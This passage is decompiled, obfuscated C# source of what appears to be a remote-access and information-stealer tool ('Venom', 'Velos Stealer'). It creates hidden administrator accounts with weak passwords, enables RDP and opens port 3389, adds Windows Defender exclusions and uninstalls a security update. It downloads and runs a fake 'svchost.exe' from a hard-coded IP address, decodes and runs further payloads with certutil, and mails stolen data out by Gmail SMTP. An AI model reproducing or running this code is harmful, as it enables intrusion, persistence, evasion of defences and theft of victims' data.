          user1.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = user;
        string newPassword2 = user;
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }

  public static void 쇍\u1CCA㓿ꩊ\uE8DA끶鯝\uE5FA讔\uE7A8૬宄ਗ㚧\u2B4D嗀\uE04B\u2779\uFFFD侬()
  {
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
    if (registryKey1 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey1 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    }
    else
      registryKey1.SetValue("fDenyTSConnections", (object) 0);
    registryKey1.Flush();
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey2 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey2 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
      registryKey2.SetValue("UserAuthentication", (object) 1);
    }
    else
      registryKey2.SetValue("UserAuthentication", (object) 1);
    registryKey2.Flush();
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
    if (registryKey3 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services", true);
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey3.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey3.Flush();
    RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", true);
    if (registryKey4 == null)
    {
      Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey4 = Registry.CurrentUser.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", true);
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    }
    else
      registryKey4.SetValue("fSingleSessionPerUser", (object) 0);
    registryKey4.Flush();
    try
    {
      RegistryKey registryKey5 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      if (registryKey5 != null && registryKey5.GetValue("Venom") != null)
        registryKey5.SetValue("Venom", (object) "0");
      Console.WriteLine("Venom desactivated");
    }
    catch (Exception ex)
    {
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.摨껔䘐ㄒ킏쀮䮟赉\u0BC9ﬠȹ形ầⵒ\uF39Aڋ鍶ڮ䅵셰("New-ItemProperty -Path HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList -Name Venom -PropertyType DWord -Value 0 -Force");
    }
    RegistryKey registryKey6 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
    if (registryKey6 == null)
    {
      Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", RegistryKeyPermissionCheck.ReadWriteSubTree);
      registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", true);
      registryKey6.SetValue("Venom", (object) 0);
    }
    else
      registryKey6.SetValue("Venom", (object) 0);
    registryKey6.Flush();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -Command netsh advfirewall firewall add rule name='allow RemoteDesktop' dir=in protocol=TCP localport=3389 action=allow & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %ProgramFiles%\\RDP Wrapper & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
  }

  public static void 摨껔䘐ㄒ킏쀮䮟赉\u0BC9ﬠȹ形ầⵒ\uF39Aڋ鍶ڮ䅵셰(string args) => new Process()
  {
    StartInfo = new ProcessStartInfo()
    {
      FileName = "powershell",
      Arguments = args,
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true
    }
  }.Start();

  public static void 푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤()
  {
    try
    {
      foreach (Process process in Process.GetProcessesByName("cmd"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("conhost"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("installrdp"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("rdpinstall"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("updaterdp"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("Install"))
        process.Kill();
      foreach (Process process in Process.GetProcessesByName("winvnc"))
        process.Kill();
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.Message);
    }
  }

  public static void \uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ() => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b del /q/f/s %TEMP%\\* & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static void 쟣\u286A㭵阁学\uE64A嶺\uF1C9澖끓胁\u31C8\uA875ꄒꩪ谿펇㥇挮픗()
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
    string fileName = Path.Combine(Path.GetTempPath(), "svchost.exe");
    new WebClient().DownloadFile("http://91.134.207.16/svchost.exe", fileName);
    Process.Start(fileName);
    Thread.Sleep(10000);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
  }

  public static void 僨싯䔽\u334Bු龜毄痻銄\uF335ر䯺踽爤\u2AC8嚕襑븅\uA8C7穼(
    string filepath,
    string email,
    string toemail,
    string password,
    string token)
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.㱊ઽ\u2EE5㠾㭠ꏝ峊纷ᝎᥴ\uF60C\uFFFD\u2F58ᖫ쀠ꑂ뱋ฎሌ\u256C();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.㰏鴾嬳ꈖᤉ롮읔菾㡃替ⅉ鶋ꈪ䲯\uFFFD鵽檾햄봜籼(token);
    try
    {
      StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "send.ps1"));
      Path.Combine(Path.GetTempPath(), "blat.exe");
      streamWriter.WriteLine("$SMTPServer = 'smtp.gmail.com';");
      streamWriter.WriteLine("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);");
      streamWriter.WriteLine("$SMTPInfo.EnableSsl = $true;");
      streamWriter.WriteLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('" + email + "', '" + password + "');");
      streamWriter.WriteLine("$ReportEmail = New-Object System.Net.Mail.MailMessage;");
      streamWriter.WriteLine("$ReportEmail.From = '" + email + "';");
      streamWriter.WriteLine("$ReportEmail.To.Add('" + toemail + "');");
      streamWriter.WriteLine("$ReportEmail.Subject = 'Velos Stealer Report';");
      streamWriter.WriteLine("$ReportEmail.Body = 'Velos Stealer report in the attachments.';");
      streamWriter.WriteLine("$ReportEmail.Attachments.Add('" + filepath + "');");
      streamWriter.WriteLine("$SMTPInfo.Send($ReportEmail);");
      streamWriter.Close();
      Thread.Sleep(5000);
      string str = Path.Combine(Path.GetTempPath(), "send.ps1");
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell -ExecutionPolicy Bypass " + str + "; & exit",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      }).WaitForExit();
      Thread.Sleep(40000);
      픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.䖲զ춨栍倀儒얝\uE8C9ښ웹㐋\uE795끮幋\u288D曔蛼㗯\uE74Cꝑ();
      쇋燌猵뾅袧֫䋐쪂僀匳᠙ꀵ\u321C\uF2A2\uF06D欩\uE10C鍡쇥煕.溫흺\uE82E岭星䮠䔡\uF7EF夶홗쯌Ἧ\uE486䨱䟢쟌勘銙욆鮵();
    }
    catch (Exception ex)
    {
    }
  }

  public static void 槝彥\u0FE3ꠁ枤蜙藾涫킆芶髩\uF3FD쵹㳱ﶈ銳鲠\uFFFD\uE9F4\uE36C(string dir, string zipPath) => Process.Start(new ProcessStartInfo()
  {
    FileName = "cmd",
    Arguments = "/k start /b powershell Compress-Archive -Path " + dir + " -DestinationPath " + zipPath + " & exit",
    CreateNoWindow = true,
    WindowStyle = ProcessWindowStyle.Hidden,
    UseShellExecute = true,
    ErrorDialog = false
  });

  public static void ᴒ厯쭷茜踓行刼亃\uEE67噓玖ؚ滑\uF50E\uE36D\uED20ꑮ䌲쟻떳(string dir)
  {
    string path = Environment.GetEnvironmentVariable("temp") + "\\" + 픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.潗櫑猯\uEFCE\u4DB6\uE366\uE81Dꥯ䰡嚋ᱡ㑢뜀\uFFFD땖蚘ꦅ\uFFFDힱ睜();
    if (!Directory.Exists(path))
      return;
    Directory.Delete(path);
  }

  public static string 潗櫑猯\uEFCE\u4DB6\uE366\uE81Dꥯ䰡嚋ᱡ㑢뜀\uFFFD땖蚘ꦅ\uFFFDힱ睜()
  {
    string str = "";
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      str = managementObject["VolumeSerialNumber"].ToString();
    }
    catch (Exception ex)
    {
    }
    return str;
  }

  public static void 웮\u27F5蕰姆֣\uEAD2\u3268屛년ᚗ\uF418ၧ멊硣\uF871\u1AFF\u2AEB縳\uE541鷷()
  {
    new ServiceController("TermService").Stop();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
    string str = "C:\\Program Files\\RDP Wrapper\\uninstall.bat";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b powershell " + str + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    string path = "C:\\Program Files\\RDP Wrapper";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.羮आ拑情ꍥטּ\uE8C7\uE0E5觾ᧈ㱼䖖魬흆婆뾭㢠頛툓୭();
    System.IO.File.SetAttributes(path, FileAttributes.Normal);
    System.IO.File.Delete(path);
  }

  public static void 䌋㩨葇ꨶ퀛祸粎욣警ɐ彳몤ꡏ騃섡쐲쓫鳊䆘\uEC12()
  {
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.푗礅囇䮋粉ฃ\u271E䥺䵚\uEE22̚ﮦ菷\u2666\uF1D1\uF6D9\uE471ꩯ쉑懤();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.\uA8BE\uFFFD\uE6A9\u24F0ᖧ䥛慅\u0382俳篑塑ⶌ賯\uEC8D\u02F8鱼䂿봎Ḿʈ();
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.āꍕ\uFFFD鴉ᵿ觤ﭿ㭟ᴝ닯o䁮汨\uF6B0\u26B1㮭\uE2CB抇\u21A3ቒ();
    string path = "C:\\Windows\\vnc";
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b del /q/f/s " + path + " & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    Directory.Delete(path, true);
    픭廴얖ヰᆘ藰\uF5B6\u1FEE査\uE9DA꣯Ẑ츲汱砄버曆縞ᢒ팿.羮आ拑情ꍥטּ\uE8C7\uE0E5觾ᧈ㱼䖖魬흆婆뾭㢠頛툓୭();
    System.IO.File.SetAttributes(path, FileAttributes.Normal);
    System.IO.File.Delete(path);
  }

  public static void 羮आ拑情ꍥטּ\uE8C7\uE0E5觾ᧈ㱼䖖魬흆婆뾭㢠頛툓୭()
  {
    if (System.IO.File.Exists("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll"))
    {
      try
      {
        System.IO.File.Delete("C:\\Program Files\\RDP Wrapper\\rdpwrap.ini");
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
        return;
      }
    }
    FileInfo fileInfo = new FileInfo("C:\\Program Files\\RDP Wrapper\\rdpwrap.dll");
    try
    {
      fileInfo.Delete();
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    try
    {
      Directory.Delete("C:\\Program Files\\RDP Wrapper");
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    if (Directory.Exists("C:\\Program Files\\RDP Wrapper"))
    {
      try
      {
        Directory.Delete("C:\\Program Files\\RDP Wrapper", true);
      }
      catch (IOException ex)
      {
        Console.WriteLine(ex.Message);
      }
    }
    DirectoryInfo directoryInfo = new DirectoryInfo("C:\\Program Files\\RDP Wrapper");
    try
    {
      directoryInfo.Delete(true);
    }
    catch (IOException ex)
    {
      Console.WriteLine(ex.Message);
    }
    string path = "C:\\Program Files\\RDP Wrapper";
    FileSecurity accessControl = System.IO.File.GetAccessControl(path);
    SecurityIdentifier user = WindowsIdentity.GetCurrent().User;
    accessControl.SetOwner((System.Security.Principal.IdentityReference) user);
    accessControl.SetAccessRule(new FileSystemAccessRule((System.Security.Principal.IdentityReference) user, FileSystemRights.FullControl, AccessControlType.Allow));
    System.IO.File.SetAccessControl(path, accessControl);
    System.IO.File.Delete(path);
  }

  public static void 㧱綴蝓蚤䜟\u290B횗覉靱㮎尛꼨㸼ঈ\uF1E5䮤䇅ਯઔ\u2F78(string link, string decodedfile)
  {
    string path1 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string fileName = Path.Combine(path1, "encrypt.txt");
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    });
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 㤑罈嘍埤Ｉ竟醙斐뉩౨암㦶틾袂軷핹\uE49A옇畿龜(string link, string encrypted, string decodedfile)
  {
    string path1 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string fileName = Path.Combine(path1, encrypted);
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    䫬칭Ģ馝ꃦ\uEF07될\uE49A钒ᗽ䩚\uF151鴛젣\u32CC䃥蹖疐䬚\uFFFD.邴ྂ쒜鮾蕉댬鬗뙊\u0BF9\u4DFF倎뜼\u26E8ୱ딄原稺驯掲\u250A(new string[1]
    {
      path
    });
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 䛰횹\u2EA6ؘ蛁톊폱桖푓ᇊ㽘霝ᤖʯឨ尜籶벫옕嚏(string link, string encrypted, string decodedfile)
  {
    string path1 = Path.Combine(윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.뚻\uA4AF벋뀇靯糄ᓹ䢓㥍群銥\u2FCA\uF07A\u2F30\uE400ྎ톄ꏘ뾘淓, 윒莫莹䨿㰊辊穌栃㰄幇ᵨ纊W航འ샧㒴軕䬂ජ.䑓冹\uFFFD\u3190ꗎᓷ酈ₖ봤儇읐ꜚ髳ꮳ\u25B7躎ᦈ艊㞞\u3030);
    string fileName = Path.Combine(path1, encrypted);
    string path = Path.Combine(path1, decodedfile);
    new WebClient().DownloadFile(link, fileName);
    Process.Start(new ProcessStartInfo()
    {
      FileName = "cmd",
      Arguments = "/k start /b certutil -decode " + fileName + "  " + path + "  & exit",
      CreateNoWindow = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      UseShellExecute = true,
      ErrorDialog = false
    }).WaitForExit();
    System.IO.File.SetAttributes(path, FileAttributes.Hidden);
  }

  public static void 槕뀣뭆\u0CD8癔噐Ѐṟ琣쿨胧\uFFFD\uE80Aꪅ䊡욗\u2615\uFFFD᪐埩(string link, string name)
  {
